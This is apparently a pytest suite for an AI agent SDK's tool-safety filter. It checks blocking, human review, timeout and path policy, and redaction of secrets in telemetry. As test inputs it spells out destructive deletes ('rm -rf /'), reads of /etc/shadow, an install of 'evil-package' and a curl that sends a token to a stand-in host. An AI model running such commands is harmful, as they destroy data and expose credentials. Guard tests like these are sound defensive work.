import asyncio
from types import SimpleNamespace
from unittest.mock import AsyncMock
from unittest.mock import MagicMock
from unittest.mock import patch

import pytest

from trpc_agent_sdk.context import AgentContext
from trpc_agent_sdk.tools import BashTool
from trpc_agent_sdk.tools._context_var import reset_tool_var
from trpc_agent_sdk.tools._context_var import set_tool_var
from trpc_agent_sdk.tools.safety._extractor import extract_safety_request
from trpc_agent_sdk.tools.safety._extractor import extract_safety_requests
from trpc_agent_sdk.tools.safety._filter import ToolSafetyFilter
from trpc_agent_sdk.tools.safety._filter import sanitize_telemetry_args
from trpc_agent_sdk.tools.safety._guard import ToolSafetyGuard
from trpc_agent_sdk.tools.safety._models import RiskLevel
from trpc_agent_sdk.tools.safety._models import SafetyDecision
from trpc_agent_sdk.tools.safety._models import SafetyReport
from trpc_agent_sdk.tools.safety._policy import ToolSafetyPolicy


class StubScanner:

    def __init__(self, policy, decision):
        self.policy = policy
        self.decision = decision
        self.requests = []

    def scan(self, request):
        self.requests.append(request)
        return SafetyReport(
            tool_name=request.tool_name,
            language=request.language,
            decision=self.decision,
            risk_level=RiskLevel.HIGH,
            rule_ids=["TEST001"],
            duration_ms=0.1,
            script_sha256="c" * 64,
            policy_version=self.policy.version,
            redacted=True,
            blocked=self.decision is not SafetyDecision.ALLOW,
        )


async def _run_filter(filter_, args, handler, *, tool_name="real_tool", tool=None):
    token = set_tool_var(tool or SimpleNamespace(name=tool_name))
    try:
        return await filter_.run(AgentContext(), args, handler)
    finally:
        reset_tool_var(token)


async def test_filter_denial_does_not_execute_handler_and_uses_real_tool_name():
    policy = ToolSafetyPolicy()
    scanner = StubScanner(policy, SafetyDecision.DENY)
    events = []
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, scanner=scanner, audit_sink=events.append))
    called = False

    async def handler():
        nonlocal called
        called = True
        return "must not run"

    result = await _run_filter(filter_, {"command": "rm -rf /"}, handler, tool_name="bash_tool")

    assert called is False
    assert result.is_continue is False
    assert result.error is None
    assert result.rsp["error"] == "tool_safety_blocked"
    assert result.rsp["decision"] == "deny"
    assert scanner.requests[0].tool_name == "bash_tool"
    assert len(events) == 1
    assert events[0].rule_id == "TEST001"


async def test_invalid_execution_metadata_is_audited_and_blocked():
    policy = ToolSafetyPolicy()
    events = []
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, audit_sink=events.append))
    called = False

    async def handler():
        nonlocal called
        called = True

    result = await _run_filter(filter_, {"command": "echo ok", "timeout": "forever"}, handler)

    assert called is False
    assert result.error is None
    assert result.rsp["rule_id"] == "SCAN-INPUT"
    assert len(events) == 1
    assert events[0].rule_id == "SCAN-INPUT"


async def test_effective_tool_timeout_is_scanned_before_handler():
    policy = ToolSafetyPolicy(max_timeout_seconds=120)
    events = []
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, audit_sink=events.append))
    tool = SimpleNamespace(name="skill_run", _timeout=300, _run_tool_kwargs={})

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"command": "echo ok"}, handler, tool=tool)

    assert result.rsp["rule_id"] == "POLICY-TIMEOUT"
    assert len(events) == 1


@pytest.mark.parametrize(
    "args",
    [
        {
            "command": "echo ok"
        },
        {
            "command": "echo ok",
            "timeout_sec": 0
        },
        {
            "command": "echo ok",
            "timeout_sec": 86400
        },
    ],
)
async def test_workspace_timeout_alias_and_default_are_scanned(args):
    policy = ToolSafetyPolicy(max_timeout_seconds=120)
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy))
    tool = SimpleNamespace(
        name="workspace_exec",
        DEFAULT_TIMEOUT_SECONDS=300,
        ZERO_TIMEOUT_USES_DEFAULT=True,
        _run_tool_kwargs={},
    )

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, args, handler, tool=tool)

    assert result.rsp["rule_id"] == "POLICY-TIMEOUT"


async def test_bash_tool_relative_cwd_is_resolved_before_scanning():
    filter_ = ToolSafetyFilter(ToolSafetyGuard(ToolSafetyPolicy()))
    tool = BashTool(cwd="/tmp")

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {
        "command": "pwd",
        "cwd": "../etc",
        "timeout": 30,
    }, handler, tool=tool)

    assert result.rsp["rule_id"] == "POLICY-CWD"


async def test_bash_tool_explicit_none_timeout_uses_bounded_default():
    tool = BashTool(cwd="/tmp")
    process = MagicMock(returncode=0)
    process.communicate = AsyncMock(return_value=(b"ok\n", b""))

    async def consume_awaitable(awaitable, *, timeout):
        return await awaitable

    wait_for = AsyncMock(side_effect=consume_awaitable)

    with patch(
            "trpc_agent_sdk.tools.file_tools._bash_tool.asyncio.create_subprocess_shell",
            new=AsyncMock(return_value=process),
    ), patch(
            "trpc_agent_sdk.tools.file_tools._bash_tool.asyncio.wait_for",
            new=wait_for,
    ):
        result = await tool._run_async_impl(tool_context=MagicMock(), args={"command": "pwd", "timeout": None})

    assert result["success"] is True
    assert wait_for.await_args.kwargs["timeout"] == tool.DEFAULT_TIMEOUT_SECONDS


async def test_fixed_tool_argument_overrides_are_scanned():
    policy = ToolSafetyPolicy()
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy))
    tool = SimpleNamespace(
        name="skill_run",
        _timeout=30,
        _run_tool_kwargs={"command": "rm -rf /tmp/work"},
    )

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"command": "echo safe"}, handler, tool=tool)

    assert result.rsp["rule_id"] == "FILE-DANGEROUS-DELETE"


async def test_guard_enforces_blocked_invariant_from_custom_scanner():
    policy = ToolSafetyPolicy()
    scanner = StubScanner(policy, SafetyDecision.DENY)
    original_scan = scanner.scan

    def inconsistent_scan(request):
        return original_scan(request).model_copy(update={"blocked": False})

    scanner.scan = inconsistent_scan
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, scanner=scanner))

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"command": "rm -rf /"}, handler)

    assert result.is_continue is False
    assert result.rsp["blocked"] is True


async def test_filter_async_reviewer_approval_executes_handler_and_records_once():
    policy = ToolSafetyPolicy()
    scanner = StubScanner(policy, SafetyDecision.NEEDS_HUMAN_REVIEW)
    events = []

    async def reviewer(report):
        await asyncio.sleep(0)
        return report.tool_name == "reviewed_tool"

    filter_ = ToolSafetyFilter(
        ToolSafetyGuard(policy, scanner=scanner, audit_sink=events.append),
        reviewer=reviewer,
    )

    async def handler():
        return {"executed": True}

    result = await _run_filter(filter_, {"code": "print('ok')"}, handler, tool_name="reviewed_tool")

    assert result.rsp == {"executed": True}
    assert result.is_continue is True
    assert len(events) == 1
    assert events[0].decision is SafetyDecision.ALLOW
    assert events[0].human_review_approved is True


async def test_filter_sync_reviewer_rejection_is_structured_denial():
    policy = ToolSafetyPolicy()
    scanner = StubScanner(policy, SafetyDecision.NEEDS_HUMAN_REVIEW)
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, scanner=scanner), reviewer=lambda report: False)

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"script": "dynamic()"}, handler)

    assert result.error is None
    assert result.rsp["decision"] == "deny"
    assert result.rsp["safety_report"]["human_review_approved"] is False


async def test_filter_rejects_non_boolean_reviewer_result():
    policy = ToolSafetyPolicy()
    scanner = StubScanner(policy, SafetyDecision.NEEDS_HUMAN_REVIEW)
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, scanner=scanner), reviewer=lambda report: "false")

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"script": "dynamic()"}, handler)

    assert result.is_continue is False
    assert result.rsp["decision"] == "deny"


def test_default_extractor_keeps_environment_names_but_not_values():
    request = extract_safety_request(
        {
            "source": "print('hello')",
            "language": "py",
            "working_dir": "/work",
            "environment": {
                "API_TOKEN": "super-secret"
            },
            "args": ["one", "two"],
            "timeout": 12,
            "max_output": 2048,
        },
        tool_name="python_tool",
    )

    assert request is not None
    assert request.environment_keys == ["API_TOKEN"]
    assert "super-secret" not in request.model_dump_json()
    assert request.argv == ["one", "two"]
    assert request.timeout_seconds == 12
    assert request.output_limit_bytes == 2048


def test_extractor_scans_command_when_empty_code_is_also_present():
    requests = extract_safety_requests({"code": "", "command": "rm -rf /"}, tool_name="mixed")

    assert len(requests) == 1
    assert requests[0].script == "rm -rf /"
    assert requests[0].language.value == "bash"


def test_extractor_scans_interpreter_stdin_with_its_actual_language():
    bash_requests = extract_safety_requests({"command": "bash -s", "stdin": "rm -rf /"}, tool_name="skill_run")
    python_requests = extract_safety_requests(
        {
            "command": "python3 -",
            "stdin": "open('/etc/shadow').read()"
        },
        tool_name="workspace_exec",
    )

    assert [(request.language.value, request.metadata["source_field"]) for request in bash_requests] == [
        ("bash", "command"),
        ("bash", "stdin"),
    ]
    assert [(request.language.value, request.metadata["source_field"]) for request in python_requests] == [
        ("bash", "command"),
        ("python", "stdin"),
    ]


def test_extractor_scans_stdin_when_interpreter_has_only_options():
    cases = [
        ({
            "command": "bash -i"
        }, "bash"),
        ({
            "command": "bash --noprofile"
        }, "bash"),
        ({
            "command": "python3 -u"
        }, "python"),
        ({
            "command": "python3.12 -I"
        }, "python"),
        ({
            "command": "python3 -u 2>/dev/null"
        }, "python"),
        ({
            "command": "bash --noprofile >shell.log"
        }, "bash"),
        ({
            "command": "PYTHONUNBUFFERED=1 python3 -u"
        }, "python"),
        ({
            "command": "env python3 -"
        }, "python"),
        ({
            "command": "/usr/bin/env -i python3 -"
        }, "python"),
        ({
            "command": "command python3 -"
        }, "python"),
        ({
            "command": "nice -n 5 python3 -"
        }, "python"),
        ({
            "command": "timeout 30 python3 -"
        }, "python"),
    ]

    for command_args, expected_language in cases:
        requests = extract_safety_requests({**command_args, "stdin": "dangerous payload"}, tool_name="workspace_exec")
        stdin_request = next(request for request in requests if request.metadata["source_field"] == "stdin")
        assert stdin_request.language.value == expected_language


def test_extractor_does_not_treat_data_stdin_as_source_when_script_is_explicit():
    cases = [
        "bash -x script.sh 2>/dev/null",
        "bash -lc 'echo ok'",
        "python3 -u script.py >output.log",
        "python3 -c 'print(1)'",
    ]

    for command in cases:
        requests = extract_safety_requests({"command": command, "stdin": "ordinary input"}, tool_name="workspace_exec")
        assert "stdin" not in [request.metadata["source_field"] for request in requests]


@pytest.mark.parametrize(
    "args",
    [
        {
            "command": "python3",
            "args": ["-c", "open('/etc/shadow').read()"]
        },
        {
            "command": "python3",
            "args": ["-Bc", "open('/etc/shadow').read()"]
        },
        {
            "command": "python3 -Ic 'open(\"/etc/shadow\").read()'"
        },
        {
            "command": "sh",
            "argv": ["-c", "cat /etc/shadow"]
        },
    ],
)
def test_extractor_scans_inline_code_from_separate_command_arguments(args):
    requests = extract_safety_requests(args, tool_name="workspace_exec")
    reports = [ToolSafetyGuard(ToolSafetyPolicy()).scan(request) for request in requests]

    assert any(request.metadata["source_field"] == "command_inline" for request in requests)
    assert any(report.decision is SafetyDecision.DENY and "FILE-DENIED-PATH" in report.rule_ids for report in reports)


@pytest.mark.parametrize(
    "arguments",
    [
        ["-m", "pip", "install", "evil-package"],
        ["-Bmpip.__main__", "install", "evil-package"],
    ],
)
def test_extractor_reconstructs_module_invocation_from_separate_arguments(arguments):
    requests = extract_safety_requests({
        "command": "python3",
        "args": arguments,
    })
    reports = [ToolSafetyGuard(ToolSafetyPolicy()).scan(request) for request in requests]

    assert any(request.metadata["source_field"] == "command_argv" for request in requests)
    assert any("DEP-INSTALL" in report.rule_ids for report in reports)


def test_extractor_preserves_workspace_timeout_and_background_metadata():
    requests = extract_safety_requests({
        "command": "python3 worker.py",
        "timeout_sec": 86400,
        "background": True,
    })
    report = ToolSafetyGuard(ToolSafetyPolicy(max_timeout_seconds=120)).scan(requests[0])

    assert requests[0].timeout_seconds == 86400
    assert requests[0].metadata["background"] is True
    assert {"POLICY-TIMEOUT", "PROC-BACKGROUND"} <= set(report.rule_ids)


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (True, True),
        (1, True),
        ("true", True),
        ("1", True),
        ("yes", True),
        (False, False),
        (0, False),
        ("false", False),
    ],
)
def test_extractor_matches_workspace_background_boolean_coercion(value, expected):
    request = extract_safety_request({
        "command": "python3 worker.py",
        "background": value,
    })
    report = ToolSafetyGuard(ToolSafetyPolicy()).scan(request)

    assert request.metadata["background"] is expected
    assert ("PROC-BACKGROUND" in report.rule_ids) is expected


def test_extractor_ignores_untrusted_stdin_language_override():
    requests = extract_safety_requests(
        {
            "command": "bash -s",
            "stdin": '""":"\nrm -rf /\n":"""\n',
            "stdin_language": "python",
        },
        tool_name="workspace_exec",
    )

    stdin_request = next(request for request in requests if request.metadata["source_field"] == "stdin")
    assert stdin_request.language.value == "bash"


def test_extractor_drops_values_from_environment_assignment_lists():
    request = extract_safety_request({
        "command": "echo ok",
        "env": ["API_KEY=do-not-retain", "PATH=/bin"],
    })

    assert request.environment_keys == ["API_KEY", "PATH"]
    assert "do-not-retain" not in request.model_dump_json()


async def test_filter_blocks_dangerous_interpreter_stdin_and_records_once():
    policy = ToolSafetyPolicy(allowed_commands=["bash"])

    class ContentScanner(StubScanner):

        def scan(self, request):
            self.requests.append(request)
            decision = SafetyDecision.DENY if "rm -rf" in request.script else SafetyDecision.ALLOW
            return SafetyReport(
                tool_name=request.tool_name,
                language=request.language,
                decision=decision,
                risk_level=RiskLevel.HIGH if decision is SafetyDecision.DENY else RiskLevel.LOW,
                rule_ids=["TEST-DANGER"] if decision is SafetyDecision.DENY else [],
                duration_ms=0.1,
                script_sha256=("d" if decision is SafetyDecision.DENY else "a") * 64,
                policy_version=self.policy.version,
                redacted=True,
                blocked=decision is SafetyDecision.DENY,
            )

    scanner = ContentScanner(policy, SafetyDecision.ALLOW)
    events = []
    filter_ = ToolSafetyFilter(ToolSafetyGuard(policy, scanner=scanner, audit_sink=events.append))

    async def handler():
        raise AssertionError("handler executed")

    result = await _run_filter(filter_, {"command": "bash -s", "stdin": "rm -rf /"}, handler)

    assert result.is_continue is False
    assert len(scanner.requests) == 2
    assert len(events) == 1
    assert events[0].decision is SafetyDecision.DENY


def test_sanitize_telemetry_args_replaces_scripts_and_environment_values():
    original = {
        "command": "curl https://evil.invalid/?token=secret",
        "nested": {
            "stdin": "password=secret",
            "env": {
                "TOKEN": "secret",
                "SAFE": "value"
            }
        },
        "api_key": "direct-secret",
        "nested_auth_token": "nested-secret",
        "payload": "Authorization: Bearer abcdefghijklmnop",
        "formatted_output": "Command: echo secret\nsecret",
        "args": ["--token", "opaque-value", "--mode", "visible"],
        "argv": ["--password=plain-value", "--secret-access-key", "aws-value", "positional"],
        "argument_string": {
            "args": "--api-key opaque-value --mode visible"
        },
        "other": "visible",
    }

    sanitized = sanitize_telemetry_args(original)

    assert sanitized["command"].startswith("<redacted sha256:")
    assert sanitized["nested"]["stdin"].startswith("<redacted sha256:")
    assert sanitized["nested"]["env"] == {"TOKEN": "<redacted>", "SAFE": "<redacted>"}
    assert sanitized["api_key"] == "<redacted>"
    assert sanitized["nested_auth_token"] == "<redacted>"
    assert sanitized["payload"].startswith("<redacted sha256:")
    assert sanitized["formatted_output"].startswith("<redacted sha256:")
    assert sanitized["args"] == ["--token", "<redacted>", "--mode", "visible"]
    assert sanitized["argv"] == [
        "--password=<redacted>",
        "--secret-access-key",
        "<redacted>",
        "positional",
    ]
    assert sanitized["argument_string"]["args"].startswith("<redacted sha256:")
    assert sanitized["other"] == "visible"
    assert original["args"][1] == "opaque-value"
    assert original["nested"]["env"]["TOKEN"] == "secret"


def test_sanitize_telemetry_args_normalizes_camel_case_sensitive_names():
    sanitized = sanitize_telemetry_args({
        "apiKey": "ordinary-proprietary-credential",
        "clientSecret": "another-proprietary-credential",
        "formattedOutput": "private tool output",
        "argv": ["--apiKey", "argument-credential", "--accessToken=inline-credential"],
    })

    assert sanitized["apiKey"] == "<redacted>"
    assert sanitized["clientSecret"] == "<redacted>"
    assert sanitized["formattedOutput"].startswith("<redacted sha256:")
    assert sanitized["argv"] == [
        "--apiKey",
        "<redacted>",
        "--accessToken=<redacted>",
    ]
